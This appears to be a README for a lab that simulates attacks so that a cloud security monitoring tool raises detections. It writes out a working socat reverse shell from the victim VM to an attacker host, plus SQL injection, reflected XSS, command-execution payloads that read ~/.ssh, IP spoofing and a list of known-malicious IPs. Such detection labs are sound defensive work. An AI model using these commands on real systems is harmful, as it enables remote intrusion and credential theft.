# 🧪 Welcome to the Attack Simulation Lab

This demo simulates various types of attacks within your **own VPC environment**. It includes Compromise Host (LW Composite alert), Remote Command Execution, XSS, IP Spoofing, and simulates known bad IP behavior. **This is only for educational and demonstration purposes only.**

![image](https://github.com/user-attachments/assets/71727044-909d-471a-9876-8858fcb27d91)


> **IMPORTANT:** All tests must be run within your **own VPC lab environment**. 

---

## 🛠️ Preparations

### Git Clone the Demo Simulator repo

```
git clone https://github.com/svuillaume/demo_simulator
```

### 1. Launch Two VMs with Public IP assigned
- **Attacker VM**
- **Victim VM**

### 2. Create an AWS ELB
- **Create a new Target Group and Register Attack VM**

Note: The above are intended for Lacework to detect these VM "Internet Exposure"

---

## Attacker VM Setup

1. **Install Docker**
2. **Deploy Lacework Agent**

---

## Victim VM Setup

1. **Install dependencies**
   ```
   sudo apt update
   sudo apt install python3 python3-pip -y
   pip3 install flask
   ```

2. **Set up the attack simulation script**
   ```
   chmod +x demo_simulator/lw_attack_sim.sh
   ```

3. **Update crypto pools in the script**  
   Use custom pool URLs:
   - `evil.v2.xmrig.com`
   - `donate.v2.xmrig.com`

4. **Edit `/etc/hosts` to redirect mining pools to attacker**
   ```plaintext
   127.0.0.1 localhost
   <Attacker-IP> donate.v2.xmrig.com
   ```

5. **Run the Flask application**
   ```
   python3 app.py
   ```
6. **Deploy Lacework Agent**
   ***Ideally enable AVD on the agent setup***   

---

# Running the Simulation

## On the Attacker VM (Open 2 Terminals or use screen)

1. **Create a persistent socket listener on Terminal 1 or screen 1:**

```
nc -k -l 3333 &
```

2. **Create a new socat tcp listener on tcp 5555**

```
socat file:`tty`,raw,echo=0 tcp-listen:5555
```
 
3. **Optionally run traffic simulation with k6 on Terminal 2 or screen 2:**

```
sudo docker run --rm -v $(pwd):/scripts grafana/k6 run /scripts/k6.js
```

### On the Victim VM

1. **Intiate an interactive Reverse Shell***

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
```
---

# HOWTO run the Demo

**On the Attacker VM**

1. **Using the establisehd Reverse Shell Connection, Run the attack simulation script***

```
./demo_simulator/lw_attack_sim.sh
```

***Note: The script will run for 5 minutes*** 
***On the Attacker VM, you can run K6.js script to generate traffic from all over the world (this is using the x-forward-for header)***

---


# Owasp Attacks: These are for your own inspiration

### Remote Command Execution (RCE)

Submit OS commands via the vulnerable Flask app:

---

### SQLI - SQL Injection

http://<victim>:5000/user?id=123
http://<victim>:5000/user?id=1%20OR%201=1

### Reflected XSS

Test for reflected XSS using the greet endpoint:

- [Greet](http://<victim_IP>:5000/greet)


**Example:**

```
http://<victim_IP>:5000/greet?name=<script>alert('GotYou :)')</script>
```

### Fetch AWS secret

```
export AWS_SECRET_ACCESS_KEY="my_fake_secret_key"
python3 web.py
```

```
http://<victim>:5000/secret
```

### RCE - Remote Code Exec

```
http://<victim>:5000/cmd?exec=ls%20-l%20/
http://localhost:5000/cmd?exec=ll%20.ssh%20/"](http://3.96.142.208:5000/cmd?exec=ls%20-l%20~/.ssh
```

---

### Client IP Logging

Test client IP extraction:

- [Client IP](http://<victim_IP>:5000/client-ip)

**Spoof IP via curl:**

```
curl -H "X-Forwarded-For: 1.2.3.4" http://<victim_IP>:5000/client-ip
```

---

## Known Bad IPs for Simulation (Use with Caution)

| IP Address       | Description                                   |
|------------------|-----------------------------------------------|
| `45.227.253.55`  | Malware C2 - AbuseIPDB                        |
| `185.220.101.1`  | Tor exit node (flagged)                       |
| `1.3.3.7`        | Red team/meme IP                              |
| `222.186.30.50`  | Brute-force attacker (common honeypot source) |
| `89.248.167.131` | Blacklisted scanner (abuse reports)           |
| `23.129.64.50`   | Tor exit node - flagged in feeds              |

> ⚠️ **Do NOT scan or connect to these IPs from outside your VPC. Use only for simulation/logging tests.**

---

## Happy Demo!

Happy testing — use responsibly in isolated environments.

---

### Socat and NetCat Clean up

***On Attacker VM***

```
lsof -i -n -P | grep nc | awk '{print $2}' | sort -u | xargs -r kill -9
```

***On Victim VM***

```
lsof -i -n -P | grep socat | awk '{print $2}' | sort -u | xargs -r kill -9
ps -p 175610 -o etime,cmd
```
